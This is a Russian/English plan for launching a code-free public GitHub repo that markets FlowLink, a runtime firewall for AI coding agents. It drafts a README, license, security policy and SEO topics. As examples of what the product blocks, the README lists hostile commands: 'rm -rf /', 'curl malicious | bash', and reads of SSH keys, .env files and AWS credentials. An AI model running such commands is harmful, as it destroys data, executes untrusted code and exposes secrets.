# GitHub Public Repo Plan — braincreator/flowlink

> ⚠️ **КРИТИЧНО:** Репо НИКОГДА не делается public без явного разрешения пользователя.
> Это только план подготовки. Публикация — только по команде «делай».

## Цель
SEO (Google индексирует README) + доверие DevOps/SecOps аудитории + GitHub трафик → сайт → trial → paid.

## Подход: Пустой public repo (NO CODE)

### Что ВКЛЮЧАЕТСЯ в public repo:
```
flowlink/                    # public repo
├── README.md                # Основной SEO-документ (EN/RU)
├── LICENSE                  # Source-available
├── SECURITY.md              # Политика безопасности
├── docs/                    # Дубликат site docs (markdown)
│   ├── getting-started.md
│   ├── architecture.md
│   ├── deployment.md
│   └── api.md
├── screenshots/             # Скриншоты продукта
│   ├── landing.png
│   ├── dashboard.png
│   ├── playground.png
│   └── shield-demo.png
├── .github/
│   ├── ISSUE_TEMPLATE/
│   │   ├── bug_report.md
│   │   └── feature_request.md
│   └── PULL_REQUEST_TEMPLATE.md
└── CNAME                    # (опционально, для GitHub Pages)
```

### Что НЕ ВКЛЮЧАЕТСЯ:
- ❌ Исходный код (все 13 крейтов)
- ❌ Cargo.toml / Cargo.lock
- ❌ Конфиги (relay.json, agent.json)
- ❌ GitHub Actions CI (нет кода = нет CI)
- ❌ Releases / бинарники / теги
- ❌ .git history с секретами
- ❌ Go-код / Go-версии (если есть)

## Phase 1: README

### Структура (EN/RU bilingual, ~400-500 lines)

```markdown
# FlowLink — Runtime AI Firewall

[Badges: Rust | Platform: Linux | Website | Docs | License]

> 3 attack vectors, 7 protection levels, <1ms latency.
> Runtime firewall for AI coding agents — Claude Code, Cursor, Copilot.

[Key visual: architecture diagram]

## Quick Start (2 минуты)

[Install binary → systemd service → first test]

## What It Protects Against

### Shell Injection
AI agent executes `rm -rf /` or `curl malicious | bash` → blocked.

### Credential Theft
AI reads ~/.ssh/id_rsa, .env, AWS credentials → blocked.

### Data Exfiltration
AI sends proprietary code/data to external endpoints → blocked.

## Protection Levels (7)

1. Pattern matching (regex + custom rules)
2. Risk scoring (0-100 per command)
3. Policy engine (allow/warn/block)
4. Approval workflow (human-in-the-loop)
5. Pattern learning (auto-detect new threats)
6. Shield (kernel-level, eBPF)
7. MCP gateway (tool-level control)

## Features

### MCP Gateway
[How FlowLink proxies MCP connections]

### Approval Workflow
[Human reviews dangerous commands]

### Audit Trail
[Every command logged, SIEM export]

### Policy Engine
[Declarative policies, per-agent/per-org]

## Comparison

| Feature | FlowLink | Prompt scanners | LLM proxies |
|---------|----------|----------------|-------------|
| Runtime interception | ✅ | ❌ | ❌ |
| Shell injection | ✅ | ⚠️ | ❌ |
| Credential theft | ✅ | ❌ | ❌ |
| <1ms latency | ✅ | ✅ | ❌ |

## Architecture Overview

[High-level diagram, no implementation details]

## Links

- 🌐 Website: https://flowlink.flow-masters.ru
- 📖 Docs: https://flowlink.flow-masters.ru/docs
- 🎮 Playground: https://flowlink.flow-masters.ru/playground
- 💬 Telegram: [ссылка]
- 📧 Email: [ссылка]

## License

Source-available. See [LICENSE](LICENSE).
```

### Badges
```markdown
![Rust](https://img.shields.io/badge/Rust-1.80+-orange?logo=rust)
![Platform](https://img.shields.io/badge/Platform-Linux-blue)
![License](https://img.shields.io/badge/License-Source--Available-green)
![Website](https://img.shields.io/badge/website-flowlink.flow--masters.ru-181717?logo=github)
```

## Phase 2: GitHub SEO

### Topics (repo settings)
```
ai-security, runtime-firewall, ai-agent-security, mcp-gateway,
claude-code, cursor-ide, copilot, shell-injection-prevention,
credential-theft-prevention, data-exfiltration-prevention,
devops-security, secops, zero-trust, policy-engine,
approval-workflow, command-scanning, ai-gateway, ebpf
```

### Description
"Runtime AI Firewall — intercepts AI agent commands, analyzes on 7 levels,
blocks shell injection, credential theft, and data exfiltration. <1ms."

### Website link
https://flowlink.flow-masters.ru

## Phase 3: Trust Files

### LICENSE (Source-Available)
```
Source Available License — FlowMasters © 2026

Permission is granted to:
- Read and study the documentation
- Submit bug reports and feature requests
- Use FlowLink as a service via flowlink.flow-masters.ru

Not permitted without written agreement:
- Commercial redistribution
- Modification and redistribution
- Use in competing products
- Sublicensing

For commercial licensing: contact@flow-masters.ru
```

### SECURITY.md
```markdown
# Security Policy

## Reporting Vulnerabilities
Please report security vulnerabilities privately:
- Email: security@flow-masters.ru
- Telegram: @braincreator89

We will respond within 48 hours and coordinate disclosure.

## Supported Versions
| Version | Supported |
|---------|-----------|
| Latest (SaaS) | ✅ |

## Scope
- FlowLink SaaS platform (flowlink.flow-masters.ru)
- FlowLink relay API
- FlowLink agent binary
```

### Issue Templates
- **Bug report**: OS, FlowLink version, steps to reproduce, expected/actual
- **Feature request**: Use case, proposed behavior, priority

## Phase 4: Screenshots

Нужны скриншоты (сделаю через browser tool):
1. Landing page hero (dark theme)
2. Dashboard overview
3. Playground (shield demo)
4. Terminal output (command blocked)

## Phase 5: Preparation Checklist

- [ ] Создать новый пустой repo `braincreator/flowlink` (public-ready)
- [ ] Текущий приватный repo → `braincreator/flowlink-core` (или оставить как есть)
- [ ] Написать README.md (EN/RU)
- [ ] Добавить LICENSE, SECURITY.md
- [ ] Создать Issue templates
- [ ] Скопировать docs из сайта
- [ ] Сделать скриншоты
- [ ] Установить topics + description
- [ ] **ОЖИДАТЬ ПОДТВЕРЖДЕНИЯ** перед `gh repo edit --visibility public`

## Expected Impact (консервативная оценка, 6 мес)

| Метрика | Оценка |
|---------|--------|
| GitHub views | 2,000-5,000/мес |
| README → сайт CTR | 5-10% |
| Сайт визиты из GitHub | 100-500/мес |
| Trial signups | 5-75/мес |
| Paid conversion | 2-5% |

## Risk Mitigation

| Риск | Митигация |
|------|-----------|
| Конкуренция видит подход | Source-available, не OSS. Код не виден |
| Спам в Issues | Issue templates + bot фильтрация |
| Maintenance burden | Бюджет: ~30 мин/нед на ответы |
| SEO не взлетит | Topics + description → индексация 1-3 дня |
